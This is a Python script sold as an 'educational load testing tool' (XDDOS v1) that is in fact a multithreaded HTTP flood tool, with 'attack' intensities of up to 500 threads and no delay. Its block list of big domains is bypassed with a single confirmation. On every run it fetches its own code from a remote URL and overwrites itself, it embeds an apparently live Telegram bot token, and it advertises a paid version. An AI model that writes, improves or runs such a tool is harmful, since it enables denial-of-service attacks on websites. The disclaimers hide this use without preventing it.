#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XDDOS v1 - Educational Load Testing Tool
GitHub: https://github.com/xhacknet/XDDos_v1
"""

import os
import sys
import time
import random
import string
import threading
import subprocess
import shutil
import webbrowser
from pathlib import Path

# ---------- Ensure Dependencies ----------
def install_package(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

try:
    import requests
except ImportError:
    print("[!] Installing requests...")
    install_package("requests")
    import requests

try:
    from colorama import init, Fore, Style
except ImportError:
    print("[!] Installing colorama...")
    install_package("colorama")
    from colorama import init, Fore, Style

init(autoreset=True)

# ---------- Configuration ----------
BOT_TOKEN = "8701118041:AAHGu4HHxAaSYE0GFIxgbnQKBKmw5VJBJMY"
GROUP_ID = "-1003792290807"
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/xhacknet/XDDos_v1/refs/heads/main/xddos.py"
PAID_LINK = "https://www.nxalimrans.site"
TOOL_LINK = "https://xddosv1.com"
TELEGRAM_GROUP_LINK = "https://t.me/XHackNet_Group"

VERIFY_FILE = Path.home() / ".xddos_verified"
UPDATE_FLAG = Path.home() / ".xddos_updating"      # prevents update loop

# ---------- Auto‑Update (reliable) ----------
def update_self():
    """Download the latest script from GitHub and restart."""
    if UPDATE_FLAG.exists():
        # Already updating – skip to avoid infinite loop
        return

    print(Fore.YELLOW + "[*] Checking for updates...")

    try:
        # Create flag file
        UPDATE_FLAG.touch()

        # Download new script
        resp = requests.get(RAW_SCRIPT_URL, timeout=10)
        resp.raise_for_status()
        new_code = resp.text

        # Path of the currently running script
        current_script = Path(__file__).resolve()
        # Create a temporary file
        temp_script = current_script.with_suffix(".tmp")
        temp_script.write_text(new_code)

        # Replace old script with new one
        shutil.move(str(temp_script), str(current_script))

        # Make it executable (Unix)
        if os.name != 'nt':
            os.chmod(current_script, 0o755)

        print(Fore.GREEN + "[✓] Updated successfully. Restarting...")
        # Restart with the new script
        os.execv(sys.executable, [sys.executable] + sys.argv)

    except Exception as e:
        print(Fore.RED + f"[!] Update failed: {e}")
        print(Fore.YELLOW + "[*] Continuing with current version...")
    finally:
        # Remove flag if we're not restarting
        if UPDATE_FLAG.exists():
            UPDATE_FLAG.unlink()

# ---------- Telegram Helpers ----------
def send_telegram_message(text):
    """Send message to the group. Returns True if successful."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": GROUP_ID, "text": text, "parse_mode": "HTML"}
    try:
        r = requests.post(url, data=payload, timeout=10)
        return r.status_code == 200
    except:
        return False

def generate_otp():
    return ''.join(random.choices(string.digits, k=6))

# ---------- OTP Verification ----------
def verify_user():
    """One‑time OTP verification. Returns True if verified."""
    if VERIFY_FILE.exists():
        return True

    print(Fore.YELLOW + "\n[!] First time use requires verification.")
    print(Fore.CYAN + f"[*] Please join: {TELEGRAM_GROUP_LINK}")

    # Try to open the link automatically
    try:
        webbrowser.open(TELEGRAM_GROUP_LINK)
        print(Fore.GREEN + "[✓] Group link opened in your browser.")
    except:
        print(Fore.YELLOW + "[!] Could not open browser. Please copy the link manually.")

    input(Fore.CYAN + "[*] Press Enter after joining the group...")

    # Generate and send OTP
    otp = generate_otp()
    msg = f"🔐 New user OTP: <code>{otp}</code>\n🕒 Time: {time.ctime()}\n🔗 Tool: {TOOL_LINK}"
    sent = send_telegram_message(msg)
    if not sent:
        print(Fore.RED + "[!] Failed to send OTP. Make sure the bot is added to the group and has send permissions.")
        print(Fore.RED + "[!] Exiting.")
        sys.exit(1)

    # Ask user to enter OTP
    attempts = 3
    for attempt in range(attempts):
        user_otp = input(Fore.CYAN + "[?] Enter the OTP from the group: ").strip()
        if user_otp == otp:
            VERIFY_FILE.write_text(time.ctime())
            print(Fore.GREEN + "[✓] Verified successfully! You won't be asked again.\n")
            send_telegram_message(f"✅ User verified via OTP {otp} at {time.ctime()}")
            return True
        else:
            print(Fore.RED + f"[!] Wrong OTP. {attempts - attempt - 1} attempt(s) left.")
    print(Fore.RED + "[!] Verification failed. Exiting.")
    sys.exit(1)

# ---------- Security Check ----------
FORBIDDEN_DOMAINS = [
    "google.com", "facebook.com", "youtube.com", "github.com", "amazon.com",
    "microsoft.com", "apple.com", "cloudflare.com", "gov", "mil", "edu"
]

def is_safe_target(url):
    """Check if the target is likely a personal/educational site."""
    from urllib.parse import urlparse
    domain = urlparse(url).netloc.lower()
    # Remove www.
    if domain.startswith("www."):
        domain = domain[4:]
    for bad in FORBIDDEN_DOMAINS:
        if bad in domain:
            return False
    return True

# ---------- Attack Functions ----------
stop_attack = False

def attack_worker(url, delay):
    global stop_attack
    while not stop_attack:
        try:
            r = requests.get(url, timeout=5)
            print(Fore.GREEN + f"[+] Request sent | Status: {r.status_code}")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        if delay > 0:
            time.sleep(delay)

def start_attack(url, intensity):
    global stop_attack
    stop_attack = False

    config = {
        "1": {"threads": 10, "delay": 0.5, "name": "LOW"},
        "2": {"threads": 50, "delay": 0.2, "name": "SLOW"},
        "3": {"threads": 200, "delay": 0.05, "name": "FAST"},
        "4": {"threads": 500, "delay": 0, "name": "ULTRA FAST"}
    }
    conf = config.get(intensity)
    if not conf:
        print(Fore.RED + "[!] Invalid intensity choice.")
        return

    print(Fore.CYAN + f"\n[*] Starting {conf['name']} attack on {url}")
    print(Fore.YELLOW + "[*] Press Ctrl+C to stop.\n")

    threads = []
    for _ in range(conf["threads"]):
        t = threading.Thread(target=attack_worker, args=(url, conf["delay"]))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Stopping attack...")
        stop_attack = True
        for t in threads:
            t.join(timeout=0.5)
        print(Fore.GREEN + "[✓] Attack stopped.\n")

# ---------- Free Version UI ----------
def free_version():
    while True:
        print(Fore.CYAN + Style.BRIGHT + "\n=== FREE VERSION ===\n")
        print("1. Start Load Test")
        print("2. Exit")
        choice = input(Fore.CYAN + "[?] Select: ").strip()

        if choice == "1":
            url = input(Fore.CYAN + "[?] Enter your website URL (with http:// or https://): ").strip()
            if not url.startswith(("http://", "https://")):
                url = "http://" + url

            # Security: block known big sites
            if not is_safe_target(url):
                print(Fore.RED + "\n[!] WARNING: You are trying to test a well‑known site.")
                print(Fore.RED + "    This tool is only for educational testing on YOUR OWN sites.")
                confirm = input(Fore.YELLOW + "Are you absolutely sure you own this site? (y/N): ").strip().lower()
                if confirm != 'y':
                    print(Fore.GREEN + "[*] Aborted.")
                    continue
            else:
                print(Fore.YELLOW + "\n[!] REMINDER: Only test websites you own or have explicit permission to test.")

            print(Fore.CYAN + "\nSelect Attack Intensity:")
            print("1. Low Attack   (10 threads, 0.5s delay)")
            print("2. Slow Attack  (50 threads, 0.2s delay)")
            print("3. Fast Attack  (200 threads, 0.05s delay)")
            print("4. Ultra Fast Attack (500 threads, no delay)")
            intensity = input(Fore.CYAN + "[?] Choose (1-4): ").strip()
            if intensity in ("1", "2", "3", "4"):
                start_attack(url, intensity)
            else:
                print(Fore.RED + "[!] Invalid choice.")
        elif choice == "2":
            print(Fore.GREEN + "[*] Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid option.")

# ---------- Paid Version ----------
def paid_version():
    print(Fore.YELLOW + "\n[*] Redirecting to paid version...")
    try:
        webbrowser.open(PAID_LINK)
    except:
        pass
    print(Fore.CYAN + f"Visit: {PAID_LINK}")

# ---------- Main ----------
def main():
    # Auto‑update
    update_self()

    # Banner
    print(Fore.CYAN + Style.BRIGHT + """
    ╔══════════════════════════════════════╗
    ║           XDDOS v1 - Load Tester     ║
    ║      Educational Purpose Only        ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)

    # Disclaimer
    print(Fore.RED + Style.BRIGHT + """
    ⚠️  DISCLAIMER ⚠️
    This tool is for EDUCATIONAL PURPOSES ONLY.
    You may ONLY test websites you own or have explicit permission to test.
    Misuse is illegal and unethical. The author is not responsible for any damage.
    """)
    confirm = input(Fore.CYAN + "Do you understand and agree? (y/n): ").strip().lower()
    if confirm != 'y':
        print(Fore.RED + "[!] Exiting.")
        sys.exit(0)

    # OTP verification
    verify_user()

    # Main menu
    while True:
        print(Fore.CYAN + Style.BRIGHT + "\n=== MAIN MENU ===")
        print("1. Free Version")
        print("2. Paid Version")
        print("3. Exit")
        main_choice = input(Fore.CYAN + "[?] Select: ").strip()

        if main_choice == "1":
            free_version()
        elif main_choice == "2":
            paid_version()
        elif main_choice == "3":
            print(Fore.GREEN + "[*] Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid option.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Interrupted. Exiting.")
        sys.exit(0)
